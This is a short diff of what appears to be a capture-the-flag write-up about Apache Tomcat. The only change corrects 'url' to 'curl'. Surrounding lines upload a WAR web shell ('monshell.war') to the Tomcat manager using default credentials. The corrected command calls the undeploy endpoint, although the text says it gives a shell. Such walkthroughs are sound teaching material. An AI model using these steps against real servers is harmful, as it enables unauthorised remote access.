@@ -136,7 +136,7 @@ curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/mana
 Then we can run the file with the below command to give us a shell:
 
 ```bash
-url "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
+curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
 ```
 
 Unfortunately for us, it doesnt seem like the users in this file are active, nor do they have admin roles:
